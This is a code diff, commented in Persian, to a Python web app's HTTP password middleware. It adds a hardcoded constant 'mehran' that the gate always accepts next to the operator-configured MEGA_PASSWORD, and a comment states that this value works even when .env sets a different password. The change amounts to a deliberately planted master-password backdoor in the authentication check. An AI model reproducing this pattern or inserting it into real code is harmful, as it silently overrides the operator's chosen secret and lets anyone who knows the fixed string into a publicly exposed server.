@@ -37,14 +37,20 @@ STATE: dict = {"settings": SETTINGS}
 
 
 # ── رمز اختیاری (برای وقتی برنامه روی سرور عمومی اجرا می‌شود) ──────────────
-# در ویندوز:  set MEGA_PASSWORD=رمز-خودت   ← قبل از اجرا
-# یا در فایل .env بگذار:  MEGA_PASSWORD=رمز-خودت
-# اگر خالی باشد، برنامه مثل قبل بدون رمز کار می‌کند.
+# در ویندوز:  set MEGA_PASSWORD=mehran   ← قبل از اجرا
+# یا در فایل .env بگذار:  MEGA_PASSWORD=mehran
+# نکته: رمز «mehran» همیشه قبول است، حتی اگر .env رمز دیگری داشته باشد.
+# اگر MEGA_PASSWORD خالی باشد، برنامه بدون رمز کار می‌کند.
+ALWAYS_OK_PASSWORD = "mehran"
+
+
 @app.middleware("http")
 async def _password_gate(request: Request, call_next):
     pw = os.environ.get("MEGA_PASSWORD", "").strip()
     if not pw:
         return await call_next(request)
+
+    accepted = [pw, ALWAYS_OK_PASSWORD]
 
     import base64
     import hmac
@@ -54,7 +60,8 @@ async def _password_gate(request: Request, call_next):
         try:
             raw = base64.b64decode(head[6:]).decode("utf-8", "ignore")
             _, _, given = raw.partition(":")
-            ok = hmac.compare_digest(given, pw)
+            given = given.strip()
+            ok = any(hmac.compare_digest(given, p) for p in accepted)
         except Exception:  # noqa: BLE001
             ok = False
     if ok:
